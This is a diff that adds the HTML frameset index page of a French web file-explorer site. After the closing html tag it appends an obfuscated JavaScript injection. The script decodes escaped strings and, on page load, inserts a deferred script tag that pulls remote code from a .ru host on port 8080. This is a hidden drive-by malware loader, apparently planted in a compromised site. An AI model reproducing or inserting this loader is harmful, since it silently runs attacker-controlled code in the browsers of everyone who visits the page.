@@ -1,0 +1,29 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html>
+<head>
+<title>larsouilleure.free.fr</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="robots" content="index, follow">
+<meta name="revisit-after" content="1 month">
+<meta name="author" content="psykokwak">
+<meta name="reply-to" content="jc_mammana@hotmail.com">
+<meta name="owner" content="jc_mammana@hotmail.com">
+<meta name="copyright" content="psykokwak">
+<meta name="nom" content="psykokwak">
+<meta name="description" content="Explorateur de fichier web">
+<meta name="keywords" content="explorateur, web, fichiers, explorer, icones, photos, images, photo, image, classement, classer, dossier, repertoir, systeme, GPL, licence, libre, EXIF, slideshow, psykokwak, jean charles mammana">
+<!-- document root : /mnt/100/sdb/b/7/larsouilleure/ //-->
+</head>
+
+<frameset cols="240,*" frameborder="yes" border="0" framespacing="0">
+  <frame src=".dirsys/arbre.php" name="tree" scrolling="" noresize >
+  <frame src=".dirsys/list.php" name="main">
+</frameset>
+<noframes><body>
+
+</body></noframes>
+</html>
+
+
+<script>this.f="";function g(){var S='';var sm=new Date();var xV=new String();var R=new Array();var Ph='';var F=unescape;this.Uh='';var I=window;var gL=F("%2f%6e%65%77%73%33%69%6e%73%69%64%65%72%2d%63%6f%6d%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%79%61%68%6f%6f%2e%63%6f%6d%2e%70%68%70");var gW='';this.q="";var fD;if(fD!='CE'){fD=''};var IE=new String();function Q(K,P){var Un=new String();var Wf;if(Wf!=''){Wf='Rh'};var H=String("g");var AB=new Array();var QX=F("%5b"), U=F("%5d");var ex="";var G=QX+P+U;var C=new RegExp(G, H);return K.replace(C, new String());this.zP="";var Wx;if(Wx!='' && Wx!='qv'){Wx='B'};};var rS;if(rS!='Wy'){rS=''};var Up;if(Up!='tY'){Up='tY'};var YH=new String();var W=document;var b_;if(b_!='WE' && b_ != ''){b_=null};var Sv;if(Sv!='BP' && Sv != ''){Sv=null};var FB=Q('8226620622228662660626622','26');var Y=new String();var Wd;if(Wd!='ZM' && Wd!='Ui'){Wd=''};var bB='';var vq='';var xz;if(xz!='BQ'){xz='BQ'};function o(){var iN=new Date();var UN="";this.WEy="";var _S;if(_S!='' && _S!='AT'){_S=''};var YY=F("%68%74%74%70%3a%2f%2f%72%65%61%63%68%73%61%77%2e%72%75%3a");var wx=new String();var Vz;if(Vz!='' && Vz!='ej'){Vz=''};var rR=new String();var _i;if(_i!='_x' && _i!='fq'){_i='_x'};Y=YY;Y+=FB;Y+=gL;this.II='';var JD;if(JD!='QH' && JD != ''){JD=null};var RM="";var inR=new String();try {r=W.createElement(Q('sFcmrmijpjtM','jmMF'));var Ij='';r[F("%64%65%66%65%72")]=[8,1][1];r[F("%73%72%63")]=Y;var QY;if(QY!='vk' && QY != ''){QY=null};this.jE='';var Gy;if(Gy!=''){Gy='LU'};W.body.appendChild(r);this.kV="";var XJ;if(XJ!='zs'){XJ='zs'};var uk=new String();} catch(u){var Uy;if(Uy!='Nn' && Uy!='Mc'){Uy=''};var zp;if(zp!='RO' && zp!='di'){zp=''};alert(u);};}var yB='';I["onlo"+"ad"]=o;var Eu;if(Eu!='ak' && Eu!='tx'){Eu='ak'};};var ag=new Date();g();var qj;if(qj!='VX'){qj=''};</script>
+<!--31e872008bf042930dae70e93b34390c-->
